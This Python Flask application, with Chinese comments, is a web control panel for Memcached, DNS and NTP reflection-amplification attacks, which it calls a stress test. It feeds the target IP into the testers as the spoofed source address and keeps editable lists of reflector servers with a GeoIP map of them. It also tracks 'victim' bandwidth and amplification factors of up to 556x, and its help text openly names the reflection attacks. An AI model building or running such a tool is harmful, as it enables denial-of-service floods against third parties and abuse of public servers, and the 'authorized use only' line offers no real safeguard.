#!/usr/bin/env python3
import os
import sys
import time
import socket
import struct
import threading
from threading import Lock, Thread
import json
import psutil
import signal
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict, field
from enum import Enum
import traceback
import subprocess
import re
import ipaddress
import urllib.error
import urllib.request

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_session import Session

# 导入测试模块
from modules.memcached_test import MemcachedTester
from modules.dns_test import DNSTester
from modules.ntp_test import NTPTester
from multi_protocol_test import MultiProtocolTester

# ========= 配置 =========
class TestMethod(Enum):
    MEMCACHED = "memcached"
    DNS = "dns"
    NTP = "ntp"
    MULTI = "multi"

class TestStatus(Enum):
    IDLE = "idle"
    RUNNING = "running"
    STOPPING = "stopping"
    COMPLETED = "completed"
    ERROR = "error"

@dataclass
class TestConfig:
    """测试配置"""
    target_ip: str
    target_port: int = 80
    method: str = "single"       # single或multi
    single_method: Optional[TestMethod] = None
    multi_protocols: List[str] = field(default_factory=lambda: ["memcached", "dns", "ntp"])
    duration_minutes: int = 5
    threads: int = 8
    data_size_kb: int = 300
    target_pps: int = 5000

@dataclass
class TestStats:
    packets_sent: int = 0
    packets_received: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    start_time: float = 0
    end_time: float = 0
    current_pps: float = 0
    current_mbps: float = 0
    status: TestStatus = TestStatus.IDLE
    error_message: str = ""
    progress_percent: float = 0
    victim_mbps: float = 0.0
    max_amplification_factor: float = 0.0
    expected_amplification: float = 0.0
    protocol_details: Dict[str, Any] = field(default_factory=dict)
    selected_protocols: List[str] = field(default_factory=list)

# ========= Flask应用 =========
app = Flask(__name__)
app.secret_key = 'your-secret-key-here-change-in-production'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_USE_SIGNER'] = True
Session(app)

VALID_SERVER_PROTOCOLS = {'memcached', 'dns', 'ntp'}
GEOIP_CACHE_FILE = os.path.join('config', 'geoip_cache.json')
GEOIP_CACHE_TTL_SECONDS = 7 * 24 * 60 * 60
GEOIP_BATCH_SIZE = 100

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ========= 全局状态 =========
class GlobalState:
    def __init__(self):
        self.current_test = None
        self.test_thread = None
        self.config = None
        self.stats = TestStats()
        self.lock = Lock()
        self.testers = {
            "memcached": MemcachedTester(),
            "dns": DNSTester(),
            "ntp": NTPTester()
        }
        self.multi_tester = MultiProtocolTester()
        self.active_tester = None

    def reset(self):
        with self.lock:
            if self.current_test and self.stats.status == TestStatus.RUNNING:
                if self.config and self.config.method == "multi":
                    if self.multi_tester:
                        self.multi_tester.stop_test()
                elif self.active_tester:
                    self.active_tester.stop_test()
                time.sleep(0.5)
            self.current_test = None
            self.test_thread = None
            self.config = None
            self.stats = TestStats()
            self.active_tester = None
            logger.info("系统状态已重置")

    def start_test(self, config: TestConfig):
        with self.lock:
            if self.current_test:
                return False, "测试已在运行中"
            self.config = config
            self.stats = TestStats()
            self.stats.status = TestStatus.RUNNING
            self.stats.start_time = time.time()
            self.stats.end_time = self.stats.start_time + (config.duration_minutes * 60)
            self.stats.selected_protocols = config.multi_protocols if config.method == "multi" else [config.single_method.value]
            self.current_test = config.method
            self.test_thread = Thread(target=self._run_test, daemon=True)
            self.test_thread.start()
            return True, "测试已启动"

    def stop_test(self):
        with self.lock:
            if self.current_test and self.stats.status == TestStatus.RUNNING:
                self.stats.status = TestStatus.STOPPING
                if self.config.method == "multi":
                    if self.multi_tester:
                        self.multi_tester.stop_test()
                else:
                    if self.active_tester and hasattr(self.active_tester, 'stop_test'):
                        self.active_tester.stop_test()
                return True, "正在停止测试..."
            return False, "没有正在运行的测试"

    def get_status(self):
        with self.lock:
            stats_dict = asdict(self.stats)
            stats_dict['status'] = self.stats.status.value
            if self.config:
                config_dict = {
                    'target_ip': self.config.target_ip,
                    'target_port': self.config.target_port,
                    'method': self.config.method,
                    'single_method': self.config.single_method.value if self.config.single_method else None,
                    'multi_protocols': self.config.multi_protocols,
                    'duration_minutes': self.config.duration_minutes,
                    'threads': self.config.threads,
                    'target_pps': self.config.target_pps
                }
                stats_dict['config'] = config_dict
            else:
                stats_dict['config'] = None
            if self.stats.status == TestStatus.RUNNING and self.stats.start_time and self.config:
                elapsed = time.time() - self.stats.start_time
                total = self.config.duration_minutes * 60
                if total > 0:
                    self.stats.progress_percent = min(100, (elapsed / total) * 100)
                    stats_dict['progress_percent'] = self.stats.progress_percent
            return stats_dict

    def _run_test(self):
        try:
            config = self.config
            if config.method == "multi":
                logger.info(f"开始多协议联合测试，协议: {config.multi_protocols}")
                def update_callback(stats):
                    with self.lock:
                        self._update_multi_stats(stats)
                self.multi_tester.run_test(
                    target_ip=config.target_ip,
                    target_port=config.target_port,
                    duration_minutes=config.duration_minutes,
                    total_threads=config.threads,
                    total_target_pps=config.target_pps,
                    protocols=config.multi_protocols,
                    stats_callback=update_callback
                )
            else:
                if not config.single_method:
                    self._set_error("未指定测试方法")
                    return
                tester = self.testers.get(config.single_method.value)
                if not tester:
                    self._set_error(f"不支持的方法: {config.single_method}")
                    return
                self.active_tester = tester
                def update_callback(stats):
                    with self.lock:
                        self._update_single_stats(stats, config.single_method.value)
                tester.run_test(
                    target_ip=config.target_ip,
                    target_port=config.target_port,
                    duration_minutes=config.duration_minutes,
                    threads=config.threads,
                    data_size_kb=config.data_size_kb,
                    target_pps=config.target_pps,
                    spoof_source_ip=config.target_ip,
                    spoof_source_port=config.target_port,
                    stats_callback=update_callback
                )
            with self.lock:
                if self.stats.status == TestStatus.STOPPING:
                    self.stats.status = TestStatus.COMPLETED
                else:
                    self.stats.status = TestStatus.COMPLETED
        except Exception as e:
            logger.error(f"测试执行错误: {str(e)}\n{traceback.format_exc()}")
            self._set_error(f"测试执行错误: {str(e)}")
        finally:
            with self.lock:
                self.active_tester = None

    def _update_single_stats(self, stats, protocol):
        self.stats.packets_sent = stats.get('packets_sent', 0)
        self.stats.packets_received = stats.get('packets_received', 0)
        self.stats.bytes_sent = stats.get('bytes_sent', 0)
        self.stats.bytes_received = stats.get('bytes_received', 0)
        self.stats.current_pps = stats.get('current_pps', 0)
        self.stats.current_mbps = stats.get('current_mbps', 0)
        if 'victim_mbps' in stats:
            self.stats.victim_mbps = stats['victim_mbps']
        if 'max_amplification_factor' in stats:
            self.stats.max_amplification_factor = stats['max_amplification_factor']
        if 'expected_amplification' in stats:
            self.stats.expected_amplification = stats['expected_amplification']
        if 'progress_percent' in stats:
            self.stats.progress_percent = stats['progress_percent']
        self.stats.protocol_details = {
            protocol: {
                'packets_sent': stats.get('packets_sent', 0),
                'current_pps': stats.get('current_pps', 0),
                'current_mbps': stats.get('current_mbps', 0),
                'amplification_factor': stats.get('max_amplification_factor', 0)
            }
        }

    def _update_multi_stats(self, stats):
        self.stats.packets_sent = stats.get('packets_sent', 0)
        self.stats.bytes_sent = stats.get('bytes_sent', 0)
        self.stats.current_pps = stats.get('current_pps', 0)
        self.stats.current_mbps = stats.get('current_mbps', 0)
        self.stats.victim_mbps = stats.get('victim_mbps', 0.0)
        self.stats.max_amplification_factor = stats.get('max_amplification_factor', 0.0)
        self.stats.progress_percent = stats.get('progress_percent', 0)
        if 'protocol_stats' in stats:
            self.stats.protocol_details = stats['protocol_stats']
        else:
            if not isinstance(self.stats.protocol_details, dict):
                self.stats.protocol_details = {}
        if self.config and self.config.method == "multi":
            for proto in self.config.multi_protocols:
                if proto not in self.stats.protocol_details:
                    self.stats.protocol_details[proto] = {
                        'packets_sent': 0, 'current_pps': 0, 'current_mbps': 0, 'amplification_factor': 0
                    }
        if 'selected_protocols' in stats:
            self.stats.selected_protocols = stats['selected_protocols']
        elif self.config and self.config.method == "multi":
            self.stats.selected_protocols = self.config.multi_protocols

    def _set_error(self, message):
        with self.lock:
            self.stats.status = TestStatus.ERROR
            self.stats.error_message = message

state = GlobalState()

def is_valid_server_method(method: str) -> bool:
    return method in VALID_SERVER_PROTOCOLS

def get_server_file(method: str) -> str:
    return os.path.join('servers', f'{method}.txt')

def read_server_entries(method: str) -> List[str]:
    filename = get_server_file(method)
    servers = []
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    servers.append(line)
    return servers

def load_geoip_cache() -> Dict[str, Any]:
    if not os.path.exists(GEOIP_CACHE_FILE):
        return {}
    try:
        with open(GEOIP_CACHE_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (OSError, json.JSONDecodeError):
        logger.warning("GeoIP cache could not be loaded", exc_info=True)
        return {}

def save_geoip_cache(cache: Dict[str, Any]) -> None:
    os.makedirs(os.path.dirname(GEOIP_CACHE_FILE), exist_ok=True)
    tmp_file = f'{GEOIP_CACHE_FILE}.tmp'
    with open(tmp_file, 'w', encoding='utf-8') as f:
        json.dump(cache, f, ensure_ascii=False, indent=2)
    os.replace(tmp_file, GEOIP_CACHE_FILE)

def resolve_public_ip(entry: str) -> Tuple[Optional[str], Optional[str]]:
    target = entry.strip()
    if not target:
        return None, 'empty'
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        return None, 'dns_failed'
    try:
        parsed = ipaddress.ip_address(ip)
    except ValueError:
        return None, 'invalid_ip'
    if not parsed.is_global:
        return None, 'private_or_reserved'
    return ip, None

def query_geoip_batch(ips: List[str]) -> Dict[str, Dict[str, Any]]:
    if not ips:
        return {}
    url = 'http://ip-api.com/batch?fields=status,message,query,lat,lon,country,city,isp'
    payload = json.dumps(ips).encode('utf-8')
    request_obj = urllib.request.Request(
        url,
        data=payload,
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    with urllib.request.urlopen(request_obj, timeout=8) as response:
        body = response.read().decode('utf-8')
    results = json.loads(body)
    if not isinstance(results, list):
        raise ValueError('GeoIP API returned an unexpected response')
    located = {}
    for item in results:
        if not isinstance(item, dict):
            continue
        ip = item.get('query')
        if item.get('status') == 'success' and ip and item.get('lat') is not None and item.get('lon') is not None:
            located[ip] = {
                'ip': ip,
                'lat': float(item.get('lat')),
                'lon': float(item.get('lon')),
                'country': item.get('country') or '',
                'city': item.get('city') or '',
                'isp': item.get('isp') or '',
                'cached_at': time.time()
            }
    return located

def build_geo_points(method: str) -> Dict[str, Any]:
    entries = read_server_entries(method)
    cache = load_geoip_cache()
    now = time.time()
    unresolved = []
    ip_entries: Dict[str, List[str]] = {}

    for entry in entries:
        ip, reason = resolve_public_ip(entry)
        if not ip:
            unresolved.append({'entry': entry, 'reason': reason})
            continue
        ip_entries.setdefault(ip, []).append(entry)

    points_by_ip = {}
    stale_points = {}
    missing_ips = []
    for ip in ip_entries:
        cached = cache.get(ip)
        if isinstance(cached, dict) and cached.get('lat') is not None and cached.get('lon') is not None:
            if now - float(cached.get('cached_at', 0)) <= GEOIP_CACHE_TTL_SECONDS:
                points_by_ip[ip] = cached
            else:
                stale_points[ip] = cached
                missing_ips.append(ip)
        else:
            missing_ips.append(ip)

    api_failed = False
    for index in range(0, len(missing_ips), GEOIP_BATCH_SIZE):
        batch = missing_ips[index:index + GEOIP_BATCH_SIZE]
        try:
            located = query_geoip_batch(batch)
            for ip, geo in located.items():
                cache[ip] = geo
                points_by_ip[ip] = geo
                stale_points.pop(ip, None)
            for ip in batch:
                if ip not in located and ip not in stale_points:
                    unresolved.append({'entry': ip_entries[ip][0], 'ip': ip, 'reason': 'geo_not_found'})
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
            api_failed = True
            logger.warning("GeoIP lookup failed: %s", exc)
            for ip in batch:
                if ip in stale_points:
                    points_by_ip[ip] = stale_points[ip]
                else:
                    unresolved.append({'entry': ip_entries[ip][0], 'ip': ip, 'reason': 'geo_api_failed'})

    if missing_ips:
        try:
            save_geoip_cache(cache)
        except OSError:
            logger.warning("GeoIP cache could not be saved", exc_info=True)

    points = []
    for ip, geo in points_by_ip.items():
        points.append({
            'ip': ip,
            'entries': ip_entries.get(ip, [ip]),
            'lat': geo.get('lat'),
            'lon': geo.get('lon'),
            'country': geo.get('country') or '',
            'city': geo.get('city') or '',
            'isp': geo.get('isp') or '',
            'stale': ip in stale_points
        })

    return {
        'success': True,
        'protocol': method,
        'total': len(entries),
        'located_count': len(points),
        'unresolved_count': len(unresolved),
        'points': points,
        'unresolved': unresolved,
        'geo_api_degraded': api_failed
    }

# ========= 路由 =========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/config', methods=['GET'])
def get_config():
    status = state.get_status()
    status['is_data_fresh'] = status.get('victim_mbps', 0) > 0
    if 'expected_amplification' not in status or status['expected_amplification'] == 0:
        if state.config:
            if state.config.method == "multi":
                status['expected_amplification'] = 556
            elif state.config.single_method:
                method = state.config.single_method.value
                amp_map = {'memcached': 50, 'dns': 54, 'ntp': 556}
                status['expected_amplification'] = amp_map.get(method, 10)
        else:
            status['expected_amplification'] = 10
    return jsonify(status)

@app.route('/api/test/start', methods=['POST'])
def start_test():
    if state.current_test:
        return jsonify({'success': False, 'message': '测试已在运行中'})
    try:
        data = request.json
        if not data.get('target_ip'):
            return jsonify({'success': False, 'message': '请输入目标IP'})
        multi_protocol = data.get('multi_protocol', False)
        selected_protocols = data.get('selected_protocols', [])
        if multi_protocol:
            if not selected_protocols:
                return jsonify({'success': False, 'message': '请至少选择一个协议'})
            valid_protocols = ["memcached", "dns", "ntp"]
            for protocol in selected_protocols:
                if protocol not in valid_protocols:
                    return jsonify({'success': False, 'message': f'无效的协议: {protocol}'})
            config = TestConfig(
                target_ip=data['target_ip'],
                target_port=int(data.get('target_port', 80)),
                method="multi",
                multi_protocols=selected_protocols,
                duration_minutes=int(data.get('duration', 5)),
                threads=int(data.get('threads', 8)),
                data_size_kb=int(data.get('data_size_kb', 300)),
                target_pps=int(data.get('target_pps', 5000))
            )
        else:
            if not data.get('method'):
                return jsonify({'success': False, 'message': '请选择测试方法'})
            try:
                single_method = TestMethod(data['method'])
            except ValueError:
                return jsonify({'success': False, 'message': '不支持的测试方法'})
            config = TestConfig(
                target_ip=data['target_ip'],
                target_port=int(data.get('target_port', 80)),
                method="single",
                single_method=single_method,
                multi_protocols=[data['method']],
                duration_minutes=int(data.get('duration', 5)),
                threads=int(data.get('threads', 8)),
                data_size_kb=int(data.get('data_size_kb', 300)),
                target_pps=int(data.get('target_pps', 5000))
            )
        success, message = state.start_test(config)
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"启动测试错误: {str(e)}")
        return jsonify({'success': False, 'message': f'启动失败: {str(e)}'})

@app.route('/api/test/stop', methods=['POST'])
def stop_test():
    success, message = state.stop_test()
    return jsonify({'success': success, 'message': message})

@app.route('/api/test/reset', methods=['POST'])
def reset_test():
    state.reset()
    return jsonify({'success': True, 'message': '已重置'})

@app.route('/api/servers/<method>', methods=['GET'])
def get_servers(method):
    try:
        if not is_valid_server_method(method):
            return jsonify({'success': False, 'message': '不支持的方法'})
        filename_map = {
            'memcached': 'servers/memcached.txt',
            'dns': 'servers/dns.txt',
            'ntp': 'servers/ntp.txt'
        }
        if method not in filename_map:
            return jsonify({'success': False, 'message': '不支持的方法'})
        filename = filename_map[method]
        servers = []
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        servers.append(line)
        if not servers:
            defaults = {
                'memcached': ['127.0.0.1'],
                'dns': ['8.8.8.8', '1.1.1.1', '9.9.9.9'],
                'ntp': ['pool.ntp.org', 'time.google.com']
            }
            servers = defaults.get(method, [])
        return jsonify({'success': True, 'servers': servers, 'count': len(servers)})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/<method>/list', methods=['GET'])
def get_server_list(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': '不支持的方法'})
    filename = get_server_file(method)
    servers = []
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    servers.append(line)
    return jsonify({'success': True, 'servers': servers})

@app.route('/api/servers/<method>/geo', methods=['GET'])
def get_server_geo(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': '不支持的方法'})
    try:
        return jsonify(build_geo_points(method))
    except Exception as e:
        logger.error("GeoIP endpoint failed: %s", e, exc_info=True)
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/<method>/update', methods=['POST'])
def update_server_list(method):
    if not is_valid_server_method(method):
        return jsonify({'success': False, 'message': '不支持的方法'})
    data = request.json
    servers = data.get('servers', [])
    if not isinstance(servers, list):
        return jsonify({'success': False, 'message': '服务器列表必须是数组'})
    valid = [s.strip() for s in servers if s.strip() and not s.strip().startswith('#')]
    filename = get_server_file(method)
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write('# 每行一个反射器IP或域名\n')
            for s in valid:
                f.write(s + '\n')
        return jsonify({'success': True, 'message': f'已保存 {len(valid)} 个服务器'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/count', methods=['POST'])
def get_server_count():
    try:
        data = request.json
        protocols = data.get('protocols', [])
        total_count = 0
        protocol_counts = {}
        default_counts = {'memcached': 1, 'dns': 3, 'ntp': 2}
        for protocol in protocols:
            if protocol in ['memcached', 'dns', 'ntp']:
                filename = f'servers/{protocol}.txt'
                count = 0
                if os.path.exists(filename):
                    with open(filename, 'r', encoding='utf-8') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                count += 1
                if count == 0:
                    count = default_counts.get(protocol, 0)
                protocol_counts[protocol] = count
                total_count += count
        return jsonify({'success': True, 'total_count': total_count, 'protocol_counts': protocol_counts})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/ping', methods=['POST'])
def ping_target():
    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({'success': False, 'message': '缺少目标地址'})
    try:
        cmd = ['ping', '-c', '1', '-W', '2', target]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            match = re.search(r'time=(\d+(?:\.\d+)?)\s*ms', result.stdout)
            if match:
                latency = float(match.group(1))
                return jsonify({'success': True, 'latency': latency})
        return jsonify({'success': False, 'message': 'ping超时或无法到达'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/tcping', methods=['POST'])
def tcping():
    import socket
    import time
    data = request.json
    target = data.get('target')
    port = data.get('port', 80)
    timeout = data.get('timeout', 5)  # 默认5秒超时
    if not target:
        return jsonify({'success': False, 'message': '缺少目标地址'})
    try:
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        end = time.time()
        sock.close()
        latency = (end - start) * 1000
        return jsonify({'success': True, 'latency': round(latency, 2)})
    except socket.timeout:
        return jsonify({'success': False, 'message': f'连接超时（{timeout}秒）'})
    except ConnectionRefusedError:
        return jsonify({'success': False, 'message': '连接被拒绝，端口可能未开放'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'连接失败: {str(e)}'})

@app.route('/api/system/info', methods=['GET'])
def get_system_info():
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        net_io = psutil.net_io_counters()
        disk = psutil.disk_usage('/')
        return jsonify({
            'success': True,
            'cpu_percent': cpu_percent,
            'memory': {
                'total': memory.total,
                'available': memory.available,
                'percent': memory.percent,
                'used': memory.used,
                'free': memory.free
            },
            'network': {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv
            },
            'disk': {
                'total': disk.total,
                'used': disk.used,
                'free': disk.free,
                'percent': disk.percent
            },
            'timestamp': time.time()
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/results')
def results():
    return render_template('results.html')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'success': False, 'message': '资源未找到'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'success': False, 'message': '服务器内部错误'}), 500

# ========= 启动辅助 =========
def check_root_privileges():
    if os.geteuid() != 0:
        print("⚠️  警告: 某些功能需要root权限才能正常运行")
        print("💡 建议使用: sudo python3 app.py")
        return False
    return True

def create_required_directories():
    dirs = ['servers', 'static', 'templates', 'logs']
    for d in dirs:
        os.makedirs(d, exist_ok=True)
        print(f"📁 确保目录存在: {d}")

def create_default_server_files():
    defaults = {
        'memcached.txt': ["# Memcached服务器列表", "127.0.0.1"],
        'dns.txt': ["# DNS服务器列表", "8.8.8.8", "1.1.1.1", "9.9.9.9", "8.8.4.4"],
        'ntp.txt': ["# NTP服务器列表", "pool.ntp.org", "time.google.com", "time.windows.com", "time.apple.com"]
    }
    for filename, lines in defaults.items():
        path = f'servers/{filename}'
        if not os.path.exists(path):
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(lines))
            print(f"📄 创建默认服务器文件: {filename}")

def setup_logging():
    log_dir = 'logs'
    os.makedirs(log_dir, exist_ok=True)
    log_file = f'{log_dir}/pressure_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
    file_handler = logging.FileHandler(log_file, encoding='utf-8')
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
    logging.getLogger().addHandler(file_handler)
    print(f"📝 日志文件: {log_file}")

def print_banner():
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                多协议联合压力测试系统 v4.0                   ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)

def print_help():
    help_text = """
使用方法:
  1. 启动服务器: sudo python3 app.py
  2. 打开浏览器访问: http://localhost:5000
  3. 配置测试参数并开始测试

支持协议:
  - Memcached反射攻击 (放大倍数: 10-50x)
  - DNS反射攻击 (放大倍数: 28-54x)
  - NTP反射攻击 (放大倍数: 556x)

注意事项:
  - 仅用于授权的压力测试
  - 需要root权限
"""
    print(help_text)

if __name__ == '__main__':
    print_banner()
    check_root_privileges()
    create_required_directories()
    create_default_server_files()
    setup_logging()
    print_help()
    print("\n🚀 启动压力测试Web界面...")
    print("🌐 访问地址: http://localhost:5000")
    print("=" * 60)
    try:
        app.run(host='0.0.0.0', port=5000, debug=False, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        print("\n🛑 服务器被用户中断")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ 启动服务器失败: {str(e)}")
        traceback.print_exc()
        sys.exit(1)
